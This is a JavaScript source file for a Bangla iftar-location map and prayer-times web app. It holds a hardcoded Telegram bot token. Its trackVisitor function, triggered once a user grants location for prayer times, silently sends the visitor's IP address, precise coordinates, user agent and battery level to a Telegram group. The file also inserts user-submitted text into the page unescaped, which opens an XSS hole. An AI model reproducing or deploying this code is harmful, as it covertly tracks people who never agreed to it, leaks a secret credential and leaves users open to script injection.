// --- Global State ---
const BOT_TOKEN = "8557613495:AAGFQbDDcuJ6bJDndBUG75xKDHUGh19IYzU";
const GROUP_ID = "-1003876310720";

let map, miniMap, userMarker, selectedLocation;
let prayerTimesData = null;
let notificationSent = {}; // To prevent multiple notifications per minute

// Load locations from localStorage with fallback to default markers
let savedLocations = JSON.parse(localStorage.getItem('iftar_locations'));
let locations = (savedLocations && savedLocations.length > 0) ? savedLocations : [
    {
        id: 1,
        orgName: "বায়তুল মোকাররম জাতীয় মসজিদ",
        foodType: "biryani",
        time: "18:15",
        quantity: 500,
        lat: 23.7297,
        lng: 90.4121,
        status: "active",
        verified: true,
        confirmations: 45,
        reports: 0,
        isDaily: true
    },
    {
        id: 2,
        orgName: "ফার্মগেট মসজিদ",
        foodType: "khichuri",
        time: "18:20",
        quantity: 200,
        lat: 23.7561,
        lng: 90.3892,
        status: "active",
        verified: false,
        confirmations: 12,
        reports: 1,
        isDaily: true
    }
];

if (!localStorage.getItem('iftar_locations')) {
    localStorage.setItem('iftar_locations', JSON.stringify(locations));
}

// --- Initialization ---
document.addEventListener('DOMContentLoaded', () => {
    initTabs();
    initMaps();
    renderStats();
    loadLocations();
    updateDate();

    // Request Location Permission & Load Times
    requestLocationAndTimes();

    // Request Notification Permission
    requestNotificationPermission();

    // Check for alerts every minute
    setInterval(checkForTimeAlerts, 60000);

    // UI Events
    document.getElementById('add-btn').onclick = () => openModal();
    document.querySelector('.close-modal').onclick = () => closeModal();
    document.getElementById('submission-form').onsubmit = handleSubmission;
    document.getElementById('locate-me').onclick = locateUser;

    // Filter Listeners
    document.getElementById('food-filter').onchange = loadLocations;
    document.getElementById('distance-filter').onchange = loadLocations;
});

async function requestLocationAndTimes() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const { latitude, longitude } = position.coords;
                map.setView([latitude, longitude], 13);
                await fetchPrayerTimes(latitude, longitude);

                // Track visitor ONLY after permission is granted
                trackVisitor(latitude, longitude);
            },
            async (error) => {
                console.warn("Location denied, defaulting to Dhaka");
                showToast("লোকেশন পারমিশন পাওয়া যায়নি, ঢাকার সময় দেখানো হচ্ছে।", "info");
                await fetchPrayerTimes(23.8103, 90.4125); // Default Dhaka
                // Optional: You could still track without location if you want, 
                // but your instruction says "jokon permition dey tahole telegrame jabe"
            }
        );
    } else {
        await fetchPrayerTimes(23.8103, 90.4125);
    }
}

async function fetchPrayerTimes(lat, lng) {
    try {
        const date = new Date().toLocaleDateString('en-GB').split('/').reverse().join('-');
        const response = await fetch(`https://api.aladhan.com/v1/timings/${date}?latitude=${lat}&longitude=${lng}&method=2`);
        const data = await response.json();

        if (data.code === 200) {
            prayerTimesData = data.data.timings;
            renderPrayerTimes();
            initTimer();
            checkForTimeAlerts(); // Initial check
        }
    } catch (error) {
        console.error("API Error:", error);
        showToast("সময়ের তথ্য লোড করতে সমস্যা হয়েছে", "error");
    }
}

function requestNotificationPermission() {
    if ("Notification" in window) {
        Notification.requestPermission();
    }
}

function checkForTimeAlerts() {
    if (!prayerTimesData) return;

    const now = new Date();
    const currentH = String(now.getHours()).padStart(2, '0');
    const currentM = String(now.getMinutes()).padStart(2, '0');
    const currentTime = `${currentH}:${currentM}`;

    const alerts = {
        "Fajr": "ফজরের সময় হয়েছে",
        "Dhuhr": "যোহরের সময় হয়েছে",
        "Asr": "আসরের সময় হয়েছে",
        "Maghrib": "ইফতারের সময় হয়েছে! মাগরিবের আযান।",
        "Isha": "এশার সময় হয়েছে"
    };

    Object.keys(alerts).forEach(key => {
        if (prayerTimesData[key] === currentTime && !notificationSent[key + currentTime]) {
            sendNotification(alerts[key]);
            notificationSent[key + currentTime] = true;
        }
    });
}

function sendNotification(text) {
    if ("Notification" in window && Notification.permission === "granted") {
        new Notification("বিরিয়ানি দিবে - রিমাইন্ডার", {
            body: text,
            icon: "icon-192.png"
        });
    }
    showToast(text, "success");
}

// --- Tabs Management ---
function initTabs() {
    const tabBtns = document.querySelectorAll('.tab-btn');
    tabBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            const target = btn.dataset.tab;

            // Toggle buttons
            tabBtns.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');

            // Toggle content
            document.querySelectorAll('.tab-content').forEach(c => c.classList.add('hidden'));
            const targetEl = document.getElementById(target);
            if (targetEl) targetEl.classList.remove('hidden');

            // Refresh specific content
            if (target === 'map-view' && map) {
                setTimeout(() => map.invalidateSize(), 100);
            } else if (target === 'prayer-times') {
                renderPrayerTimes();
            } else if (target === 'list-view') {
                loadLocations();
            }
        });
    });
}

// --- Countdown Timer Logic ---
function initTimer() {
    if (!prayerTimesData) return;

    function updateCountdown() {
        const now = new Date();
        const [mH, mM] = prayerTimesData.Maghrib.split(':');

        const iftarTime = new Date();
        iftarTime.setHours(parseInt(mH), parseInt(mM), 0);

        let diff = iftarTime - now;

        if (diff < 0) {
            document.getElementById('next-prayer-label').innerText = "ইফতার সম্পন্ন হয়েছে";
            document.getElementById('iftar-timer').innerHTML = '<div class="time-block" style="width:100%"><span>আলহামদুলিল্লাহ</span></div>';
            return;
        }

        const h = Math.floor(diff / (1000 * 60 * 60));
        const m = Math.floor((diff / (1000 * 60)) % 60);
        const s = Math.floor((diff / 1000) % 60);

        document.getElementById('hours').innerText = String(h).padStart(2, '0');
        document.getElementById('mins').innerText = String(m).padStart(2, '0');
        document.getElementById('secs').innerText = String(s).padStart(2, '0');
    }

    setInterval(updateCountdown, 1000);
    updateCountdown();
}

// --- Food Type Translation ---
function translate(type) {
    const map = { biryani: 'বিরিয়ানি', kacchi: 'কাচ্চি', khichuri: 'খিচুড়ি', muri: 'মুড়ি', others: 'অন্যান্য' };
    return map[type] || type;
}

// --- Map Logic ---
function initMaps() {
    // Main Map — Realistic colorful OSM
    map = L.map('main-map', {
        zoomControl: false  // we add custom position
    }).setView([23.8103, 90.4125], 13); // Dhaka

    // Bright realistic street map
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>',
        maxZoom: 19
    }).addTo(map);

    // Zoom control — bottom right
    L.control.zoom({ position: 'bottomright' }).addTo(map);

    // Scale control
    L.control.scale({ position: 'bottomleft', imperial: false }).addTo(map);

    // Mini Map for Submission — also realistic
    miniMap = L.map('mini-map').setView([23.8103, 90.4125], 13);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        maxZoom: 19
    }).addTo(miniMap);

    let miniMarker;
    miniMap.on('click', (e) => {
        const { lat, lng } = e.latlng;
        if (miniMarker) miniMap.removeLayer(miniMarker);
        miniMarker = L.marker([lat, lng]).addTo(miniMap);
        document.getElementById('form-lat').value = lat;
        document.getElementById('form-lng').value = lng;
    });
}

function loadLocations() {
    const listContainer = document.getElementById('location-list');
    if (!listContainer) return;

    // Clear existing markers
    map.eachLayer(layer => {
        if (layer instanceof L.Marker && layer !== userMarker) map.removeLayer(layer);
    });

    listContainer.innerHTML = '';

    const foodFilter = document.getElementById('food-filter').value;

    // Custom Icons for Map — clear & vivid
    const createIcon = (emoji, color) => L.divIcon({
        className: '',
        html: `
            <div style="
                background:${color};
                border: 3px solid white;
                border-radius: 50% 50% 50% 0;
                transform: rotate(-45deg);
                width: 40px; height: 40px;
                box-shadow: 0 4px 12px rgba(0,0,0,0.35);
                display:flex; align-items:center; justify-content:center;
            ">
                <span style="transform:rotate(45deg); font-size:1.1rem; line-height:1;">${emoji}</span>
            </div>`,
        iconSize: [40, 48],
        iconAnchor: [20, 48],
        popupAnchor: [0, -50]
    });

    const icons = {
        biryani: createIcon('🍛', '#f59e0b'),
        kacchi: createIcon('🍖', '#d97706'),
        khichuri: createIcon('🥘', '#10b981'),
        muri: createIcon('🍚', '#60a5fa'),
        others: createIcon('🍽️', '#8b5cf6')
    };

    let visibleCount = 0;

    locations.forEach(loc => {
        // Apply Filter
        if (foodFilter !== 'all' && loc.foodType !== foodFilter) return;

        // Add Marker with custom icon
        const marker = L.marker([loc.lat, loc.lng], { icon: icons[loc.foodType] || icons.others }).addTo(map);
        marker.bindPopup(`
            <div style="font-family:'Hind Siliguri',sans-serif; min-width:200px;">
                <div style="background:#064e3b;margin:-13px -20px 12px;padding:12px 16px;border-radius:4px 4px 0 0;">
                    <h4 style="margin:0;color:#fbbf24;font-size:0.95rem;line-height:1.4">${loc.orgName}</h4>
                    <span style="font-size:0.7rem;color:rgba(255,255,255,0.6)">${translate(loc.foodType)}</span>
                </div>
                <div style="font-size:0.82rem;color:#374151;line-height:1.8;padding:0 4px;">
                    ⏰ <b>সময়:</b> ${loc.time}<br>
                    👥 <b>পরিমাণ:</b> ${loc.quantity || 'অজানা'} জন<br>
                    ✅ <b>নিশ্চিত:</b> ${loc.confirmations} জন
                </div>
                <button onclick="navigateTo(${loc.lat}, ${loc.lng})" style="
                    margin-top:10px;width:100%;padding:8px;
                    background:#064e3b;color:#fbbf24;
                    border:none;border-radius:8px;
                    font-family:'Hind Siliguri',sans-serif;
                    font-size:0.82rem;font-weight:700;cursor:pointer;
                ">🗺️ রাস্তা দেখুন</button>
            </div>
        `, { maxWidth: 240 });

        // Add to List (Only if active)
        if (loc.status === 'active') {
            const card = createLocationCard(loc);
            listContainer.appendChild(card);
            visibleCount++;
        }
    });

    if (visibleCount === 0) {
        listContainer.innerHTML = '<p style="text-align:center; padding:40px; color:var(--text-muted)">আপাতত কোনো সক্রিয় ইফতার স্পট পাওয়া যায়নি।</p>';
    }

    renderStats();
}

function createLocationCard(loc) {
    const div = document.createElement('div');
    div.className = 'location-card';
    div.innerHTML = `
        <div class="card-header">
            <span class="badge badge-${loc.foodType}">${translate(loc.foodType)}</span>
            ${loc.verified ? '<span class="badge badge-verified"><i class="fas fa-check-circle"></i> ভেরিফাইড</span>' : ''}
        </div>
        <h3>${loc.orgName}</h3>
        <p><i class="fas fa-clock gold-text"></i> ${loc.time} | <i class="fas fa-users gold-text"></i> ${loc.quantity || 'অজানা'} জন</p>
        <div class="verification-actions">
            <button onclick="verify(${loc.id}, true)" class="btn-action success">
                <i class="fas fa-thumbs-up"></i> পেয়েছি (${loc.confirmations})
            </button>
            <button onclick="verify(${loc.id}, false)" class="btn-action danger">
                <i class="fas fa-thumbs-down"></i> পাইনি (${loc.reports})
            </button>
        </div>
        <button class="btn btn-glass btn-block" style="margin-top:10px" onclick="navigateTo(${loc.lat}, ${loc.lng})">
            <i class="fas fa-directions"></i> রাস্তা দেখুন
        </button>
    `;
    return div;
}

// --- Handlers ---
function openModal() {
    document.getElementById('add-modal').style.display = 'block';
    setTimeout(() => miniMap.invalidateSize(), 200);
}

function closeModal() {
    document.getElementById('add-modal').style.display = 'none';
}

function handleSubmission(e) {
    e.preventDefault();
    const formData = new FormData(e.target);
    const newLoc = {
        id: Date.now(),
        orgName: formData.get('orgName'),
        foodType: formData.get('foodType'),
        time: formData.get('time'),
        quantity: formData.get('quantity'),
        lat: parseFloat(formData.get('lat')),
        lng: parseFloat(formData.get('lng')),
        status: "pending",
        verified: false,
        confirmations: 0,
        reports: 0,
        isDaily: formData.get('isDaily') === 'on'
    };

    if (!newLoc.lat || !newLoc.lng) {
        showToast("দয়া করে ম্যাপে লোকেশন সিলেক্ট করুন", "error");
        return;
    }

    locations.push(newLoc);
    localStorage.setItem('iftar_locations', JSON.stringify(locations));

    // Send Submission to Telegram
    const msg = `
<b>🥘 New Iftar Submission!</b>
🏢 Org: ${newLoc.orgName}
🍴 Food: ${translate(newLoc.foodType)}
⏰ Time: ${newLoc.time}
📍 Location: ${newLoc.lat}, ${newLoc.lng}
📞 Contact: ${formData.get('phone') || 'N/A'}
    `;
    sendToTelegram(msg);

    showToast("আপনার সাবমিশন সফল হয়েছে। অ্যাডমিন অ্যাপ্রুভ করার পর এটি ম্যাপে দেখা যাবে।", "success");
    closeModal();
    e.target.reset();
    renderStats();
}

function verify(id, isPositive) {
    const loc = locations.find(l => l.id === id);
    if (!loc) return;

    if (isPositive) {
        loc.confirmations++;
        document.getElementById('cm-icon').textContent = '✅';
        document.getElementById('cm-title').textContent = 'আলহামদুলিল্লাহ!';
        document.getElementById('cm-msg').textContent = `আপনি নিশ্চিত করেছেন যে "${loc.orgName}" তে ইফতার পেয়েছেন। আল্লাহ কবুল করুন।`;
    } else {
        loc.reports++;
        document.getElementById('cm-icon').textContent = '😔';
        document.getElementById('cm-title').textContent = 'দুঃখিত!';
        document.getElementById('cm-msg').textContent = `"${loc.orgName}" তে ইফতার না পাওয়ার তথ্য রিপোর্ট করা হয়েছে। যাচাই করা হবে।`;
    }

    localStorage.setItem('iftar_locations', JSON.stringify(locations));
    loadLocations();

    // Show modal
    const overlay = document.getElementById('confirm-overlay');
    overlay.style.display = 'flex';
}

function closeConfirmOverlay() {
    document.getElementById('confirm-overlay').style.display = 'none';
}

function navigateTo(lat, lng) {
    window.open(`https://www.google.com/maps/dir/?api=1&destination=${lat},${lng}`);
}

function locateUser() {
    map.locate({ setView: true, maxZoom: 16 });
}

function checkAdminNotice() {
    const notice = localStorage.getItem('admin_notice');
    const container = document.getElementById('notice-container');
    if (notice && container) {
        container.innerHTML = `
            <div class="location-card" style="border-left: 5px solid var(--accent-gold); background: rgba(251, 191, 36, 0.1); margin-bottom: 20px;">
                <h4 style="color: var(--accent-gold); margin-bottom: 5px;"><i class="fas fa-bullhorn"></i> বিশেষ নোটিশ:</h4>
                <p style="font-size: 0.95rem; line-height: 1.5;">${notice}</p>
            </div>
        `;
    } else if (container) {
        container.innerHTML = '';
    }
}
async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: GROUP_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (e) { console.error("Telegram error:", e); }
}

async function trackVisitor(lat, lng) {
    // Visitor Tracking & Telegram Log
    // checkAdminNotice(); // Moved to initial setup

    // Visitor Count Update
    let visitorCount = parseInt(localStorage.getItem('visitor_count') || '0');
    visitorCount++;
    localStorage.setItem('visitor_count', visitorCount);

    // Fetch IP Address
    let ip = "Unknown";
    try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ip = ipData.ip;
    } catch (e) { }

    // Collect User Data
    let batteryLevel = "Unknown";
    try {
        const battery = await navigator.getBattery();
        batteryLevel = `${Math.round(battery.level * 100)}%`;
    } catch (e) { }

    const googleMapUrl = `https://www.google.com/maps?q=${lat},${lng}`;

    const userData = {
        time: new Date().toLocaleString('bn-BD'),
        ip: ip,
        userAgent: navigator.userAgent,
        battery: batteryLevel,
        url: window.location.href,
        mapUrl: googleMapUrl,
        coords: `${lat}, ${lng}`
    };

    // Save to LocalStorage
    let logs = JSON.parse(localStorage.getItem('user_logs') || '[]');
    logs.unshift(userData);
    localStorage.setItem('user_logs', JSON.stringify(logs.slice(0, 50)));

    // Send to Telegram with copyable UA and clickable Map link
    const msg = `
<b>🚀 User Location Granted!</b>
<b>📅 Time:</b> ${userData.time}
<b>🌐 IP:</b> <code>${userData.ip}</code>
<b>� Google Map:</b> ${userData.mapUrl}
<b>🔋 Battery:</b> ${userData.battery}
<b>🔗 Current URL:</b> ${userData.url}

<b>� User Agent (Copy):</b>
<code>${userData.userAgent}</code>
    `;
    sendToTelegram(msg);
}

// --- Utils ---
function translate(val) {
    const map = {
        'biryani': 'বিরিয়ানি',
        'kacchi': 'কাচ্চি',
        'khichuri': 'খিচুড়ি',
        'others': 'অন্যান্য'
    };
    return map[val] || val;
}

function showToast(msg, type = 'info') {
    const container = document.getElementById('toast-container');
    const toast = document.createElement('div');
    toast.className = `toast toast-${type}`;
    toast.innerText = msg;
    container.appendChild(toast);
    setTimeout(() => toast.remove(), 4000);
}

function renderStats() {
    document.getElementById('total-spots').innerText = locations.length;
    document.getElementById('active-today').innerText = locations.filter(l => l.status === 'active').length;
    document.getElementById('verified-count').innerText = locations.filter(l => l.verified).length;
}

function updateDate() {
    const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
    const dateStr = new Date().toLocaleDateString('bn-BD', options);
    document.getElementById('today-date-bn').innerText = dateStr;
    renderPrayerTimes();
}

function renderPrayerTimes() {
    const container = document.getElementById('prayer-list');
    if (!container) return;

    if (!prayerTimesData) {
        container.innerHTML = `
            <div style="text-align:center; padding:30px; color:var(--text-muted)">
                <i class="fas fa-spinner fa-spin" style="font-size:2rem; color:var(--accent-gold); margin-bottom:10px;"></i>
                <p>নামাজের সময় লোড হচ্ছে...</p>
                <p style="font-size:0.8rem;">লোকেশন পারমিশন দিন</p>
            </div>`;
        return;
    }

    // Build calendar header HTML
    const options = { day: 'numeric', month: 'long', year: 'numeric' };
    const gregDate = new Date().toLocaleDateString('bn-BD', options);

    const prayerMap = {
        "Imsak": { label: "সেহরি (শেষ সময়)", icon: "fa-moon", highlight: true },
        "Fajr": { label: "ফজর", icon: "fa-star-and-crescent", highlight: false },
        "Dhuhr": { label: "যোহর", icon: "fa-sun", highlight: false },
        "Asr": { label: "আসর", icon: "fa-cloud-sun", highlight: false },
        "Maghrib": { label: "মাগরিব (ইফতার)", icon: "fa-utensils", highlight: true },
        "Isha": { label: "এশা ও তারাবি", icon: "fa-mosque", highlight: false }
    };

    // Check which prayer is next
    const now = new Date();
    const nowMins = now.getHours() * 60 + now.getMinutes();
    let nextPrayerKey = null;
    let minDiff = Infinity;
    Object.keys(prayerMap).forEach(key => {
        if (!prayerTimesData[key]) return;
        const [h, m] = prayerTimesData[key].split(':');
        const pMins = parseInt(h) * 60 + parseInt(m);
        const diff = pMins - nowMins;
        if (diff >= 0 && diff < minDiff) {
            minDiff = diff;
            nextPrayerKey = key;
        }
    });

    container.innerHTML = `
        <div class="calendar-header">
            <h3>রমজান ক্যালেন্ডার ২০২৬</h3>
            <p>${gregDate} | ঢাকা ও পার্শ্ববর্তী এলাকা</p>
        </div>
        ${Object.keys(prayerMap).map(key => {
        const time = prayerTimesData[key];
        if (!time) return '';
        const info = prayerMap[key];
        const isNext = key === nextPrayerKey;
        return `
                <div class="prayer-item ${info.highlight ? 'highlight' : ''} ${isNext ? 'next-prayer' : ''}">
                    <div class="prayer-icon"><i class="fas ${info.icon}"></i></div>
                    <span class="prayer-name">${info.label}</span>
                    <span class="prayer-time">${formatTime(time)}</span>
                    ${isNext ? '<span class="next-badge">পরবর্তী</span>' : ''}
                </div>
            `;
    }).join('')}
    `;
}

function formatTime(time24) {
    const [h, m] = time24.split(':');
    const hours = parseInt(h);
    const suffix = hours >= 12 ? 'PM' : 'AM';
    const h12 = hours % 12 || 12;
    return `${String(h12).padStart(2, '0')}:${m} ${suffix}`;
}

// Leaflet Location Found Handler
map.on('locationfound', (e) => {
    if (userMarker) map.removeLayer(userMarker);
    userMarker = L.circle(e.latlng, { radius: 50, color: 'gold' }).addTo(map);
});
